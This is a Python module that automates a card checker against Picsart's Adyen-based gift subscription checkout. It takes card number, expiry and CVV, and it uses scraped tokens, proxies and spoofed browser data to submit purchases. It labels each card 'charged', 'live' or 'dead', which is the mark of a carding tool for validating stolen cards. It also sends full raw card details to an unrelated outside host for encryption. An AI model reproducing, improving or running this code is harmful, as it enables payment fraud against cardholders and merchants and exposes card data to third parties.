"""
Adyen Payment Gateway - Picsart.com flow from chk/adyen.py.
"""

import re
import json
import uuid
import time
import random
from typing import Dict, Any, Optional
from datetime import datetime
import httpx


class _ClientCtx:
    def __init__(self, proxy=None):
        self._proxy = proxy
    async def __aenter__(self):
        limits = httpx.Limits(max_connections=50, max_keepalive_connections=20)
        self._client = httpx.AsyncClient(timeout=25.0, proxy=self._proxy, follow_redirects=True, limits=limits)
        return self._client
    async def __aexit__(self, *args):
        pass

class AdyenGateway:
    name = "adyen"
    display_name = "Adyen (Picsart)"

    supported_cards = ["visa", "mastercard"]
    supported_currencies = ["USD", "EUR", "GBP"]

    CLIENT_KEY = "live_AWRY4KLIVNGCRDVAOUBDDX4OU4UE4VPH"
    ADYEN_KEY = "10001|C6EF5A6E98A3FFE920C6347D16B8203F4A478CFA672D4CC76F3D0976AB81F51BFDCEB81155A05B677D7892F567BDBA9149009787838F9E7F619105717CB3A068FA636B9AF967876B978B0E55E53E86E58F4F62AA822FE79B0211B6A6007D461D7E13DFFD191EAD8AC6C1C877BB11A34544FE42B4FE021793C29620B896CBDC6C0680D0C6C9E59AC6239EDF5BE28DEB27DA9F535C3E6FFE1C2B4EFED06309F396AC3E532B3395A43B510293AEFF7D8EF9DEB36C98FF35C351DD5704BA14FE1BAC7A21FBB493F7CEA5CEBAB1BFE15CAF2BFBE9840353EE628B8915F8B3847AB8AE1761A15D506844E37C7104E466DE17D51625806692EC8C25072280D715319059"
    ENCRYPT_URL = "https://asianprozyy.us/encrypt/adyenv2"
    PURCHASE_URL = "https://api.picsart.com/shop/subscription/adyen/purchase"
    TOKEN_URL = "https://picsart.com/pricing/special-offer/gift"
    ANALYTICS_URL = "https://checkoutanalytics-live.adyen.com/checkoutanalytics/v3/analytics"

    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"

    @classmethod
    async def _get_checkout_attempt_id(cls, client: httpx.AsyncClient) -> str:
        try:
            resp = await client.post(
                cls.ANALYTICS_URL,
                params={"clientKey": cls.CLIENT_KEY},
                json={
                    "version": "6.12.0", "channel": "Web", "platform": "Web",
                    "buildType": "esm", "locale": "en-US",
                    "referrer": "https://picsart.com/pricing/special-offer/gift",
                    "screenWidth": 1920, "containerWidth": 0,
                    "component": "scheme", "flavor": "components", "level": "all",
                },
                headers={"Content-Type": "application/json"},
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                return data.get("checkoutAttemptId") or data.get("id", "")
        except Exception:
            pass
        return str(uuid.uuid4()) + str(int(time.time() * 1000))

    @classmethod
    async def _get_token(cls, client: httpx.AsyncClient) -> Optional[str]:
        try:
            resp = await client.get(
                cls.TOKEN_URL,
                headers={"User-Agent": cls.UA, "Accept": "text/html"},
                timeout=10,
            )
            if resp.status_code == 200:
                m = re.search(r'"access_token":\s*"([^"]+)"', resp.text)
                if m:
                    return m.group(1)
        except Exception:
            pass
        return None

    @classmethod
    async def process(
        cls,
        card_number: str,
        exp_month: int,
        exp_year: int,
        cvv: str,
        amount: float = 5.0,
        currency: str = "USD",
        proxy: Optional[str] = None,
        **kwargs
    ) -> Dict[str, Any]:
        t0 = time.time()
        try:
            card_type = cls._detect_card_type(card_number)
            if card_type not in cls.supported_cards:
                return {"status": "error", "success": False, "message": f"Adyen does not support {card_type}", "gateway": cls.name}

            if exp_year > 99:
                exp_year = exp_year % 100

            cc = card_number.replace(" ", "").replace("-", "")
            mm = str(exp_month).lstrip("0") if exp_month != 10 else "10"
            yyyy = str(2000 + exp_year) if exp_year < 100 else str(exp_year)
            brand = "visa" if cc[0] == "4" else "mc"

            async with _ClientCtx(proxy) as client:
                checkout_attempt_id = await cls._get_checkout_attempt_id(client)
                token = await cls._get_token(client)
                if not token:
                    return {"status": "error", "success": False, "message": "Token fetch failed", "gateway": cls.name, "time": round(time.time() - t0, 2)}

                encrypt_resp = await client.post(
                    cls.ENCRYPT_URL,
                    json={
                        "card": f"{cc}|{mm}|{yyyy}|{cvv}",
                        "adyenKey": cls.ADYEN_KEY,
                        "version": "5.5.1",
                        "origin": "https://picsart.com",
                        "originKey": cls.CLIENT_KEY,
                    },
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )
                if encrypt_resp.status_code != 200 or not encrypt_resp.json().get("success"):
                    return {"status": "error", "success": False, "message": "Encryption failed", "gateway": cls.name, "time": round(time.time() - t0, 2)}

                ed = encrypt_resp.json()
                purchase_resp = await client.post(
                    cls.PURCHASE_URL,
                    json={
                        "items": [{"id": "gift_pro_monthly"}],
                        "adyenData": {
                            "riskData": {"clientData": ed.get("riskData")},
                            "paymentMethod": {
                                "type": "scheme", "holderName": "",
                                "encryptedCardNumber": ed.get("encryptedCardNumber"),
                                "encryptedExpiryMonth": ed.get("encryptedExpiryMonth"),
                                "encryptedExpiryYear": ed.get("encryptedExpiryYear"),
                                "encryptedSecurityCode": "",
                                "brand": brand,
                                "checkoutAttemptId": checkout_attempt_id,
                            },
                            "browserInfo": {
                                "acceptHeader": "*/*", "colorDepth": 32,
                                "language": "en-US", "javaEnabled": False,
                                "screenHeight": 1080, "screenWidth": 1920,
                                "userAgent": cls.UA, "timeZoneOffset": -480,
                            },
                            "origin": "https://picsart.com",
                            "clientStateDataIndicator": True,
                        },
                        "redirectUrl": "https%3A%2F%2Fpicsart.com%2Fpricing%2Fspecial-offer%2Fgift",
                        "analyticsInfo": {"impact_click_id": ""},
                    },
                    headers={
                        "x-app-authorization": f"Bearer {token}",
                        "authorization": f"Bearer {token}",
                        "Content-Type": "application/json",
                    },
                    timeout=10,
                )

                elapsed = round(time.time() - t0, 2)

                if purchase_resp.status_code == 201:
                    result = purchase_resp.json()
                    rc = result.get("response", {}).get("resultCode", "Unknown")

                    if rc == "Authorised":
                        return {"status": "charged", "success": True, "message": "Authorised", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "amount": 1.0, "time": elapsed, "timestamp": datetime.now().isoformat()}
                    elif rc == "RedirectShopper":
                        return {"status": "live", "success": True, "message": "3DS Required - Live", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                    elif rc == "Refused":
                        return {"status": "dead", "success": False, "message": "Refused", "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                    else:
                        return {"status": "dead", "success": False, "message": rc, "gateway": cls.name, "card_type": card_type, "card_last4": card_number[-4:], "time": elapsed, "timestamp": datetime.now().isoformat()}
                else:
                    return {"status": "error", "success": False, "message": f"HTTP {purchase_resp.status_code}", "gateway": cls.name, "time": elapsed, "timestamp": datetime.now().isoformat()}

        except Exception as e:
            return {"status": "error", "success": False, "message": f"Adyen error: {str(e)}", "gateway": cls.name, "time": round(time.time() - t0, 2), "timestamp": datetime.now().isoformat()}

    @classmethod
    def _detect_card_type(cls, card_number: str) -> str:
        card_number = card_number.replace(" ", "").replace("-", "")
        if card_number.startswith("4"):
            return "visa"
        elif card_number.startswith(("51", "52", "53", "54", "55")):
            return "mastercard"
        return "unknown"

    @classmethod
    async def test_connection(cls) -> Dict:
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                resp = await client.get(cls.TOKEN_URL)
                return {"success": resp.status_code == 200, "gateway": cls.name, "message": "Adyen reachable", "status": "online"}
        except Exception as e:
            return {"success": False, "gateway": cls.name, "message": str(e), "status": "offline"}
